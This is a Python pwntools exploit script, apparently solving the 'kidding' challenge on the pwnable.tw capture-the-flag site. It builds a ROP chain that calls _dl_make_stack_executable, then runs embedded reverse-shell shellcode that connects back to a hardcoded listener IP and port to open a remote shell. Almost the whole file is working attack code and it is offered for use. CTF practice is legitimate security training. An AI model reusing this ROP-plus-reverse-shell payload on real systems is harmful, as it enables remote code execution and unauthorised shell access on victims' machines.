from pwn import *

class KiddingSolver(object):
    reverse_shellcode = (
        "\x6a\x01\x5b\x99\xb0\x66\x52\x53\x6a"
        "\x02\x89\xe1\xcd\x80\x5e\x59\x93\xb0\x3f"
        "\xcd\x80\xb0\x66\x55\x66\x50\x66\x56"
        "\x89\xe1\x0e\x51\x53"
        "\x89\xe1\xb3\x03\xcd\x80\xb0\x0b\x59\x68\x2f\x73\x68"
        "\x00\x68\x2f\x62\x69\x6e\x89\xe3"
        "\xcd\x80"
    )

    listen_ip        = '140.112.90.89'
    listen_port      = 0x6600

    def __init__(self, prog, ps):
        self.prog = ELF(prog)
        self.ps   = ps
    
    def construct_rop(self):
        rop = ROP(self.prog)

        # __stack_prot = 7
        rop.raw(rop.find_gadget(['pop ecx', 'ret']).address)
        rop.raw(rop.resolve('__stack_prot'))
        rop.raw(rop.find_gadget(['pop dword ptr [ecx]', 'ret']).address)
        rop.raw(7)

        # call _dl_make_stack_executable
        rop.raw(rop.find_gadget(['pop eax', 'ret']).address)
        rop.raw(rop.resolve('__libc_stack_end'))
        rop.raw(rop.resolve('_dl_make_stack_executable'))

        # Run our shellcode
        rop.raw(0x080c99b0) # call esp

        #print disasm(self.reverse_shellcode)
        to_send  = (
            'A' * 8 + binary_ip(self.listen_ip) +
            str(rop) +
            self.reverse_shellcode
        )

        return to_send

    def spawn_shell(self):
        listener = listen(self.listen_port)
        self.ps.send(self.construct_rop())
        listener.interactive()


if __name__ == '__main__':
    solver = KiddingSolver(
        './kidding/kidding',
        remote('ctf.pwnable.tw', 8361)
        #process('./kidding/kidding')
    )
    solver.spawn_shell()
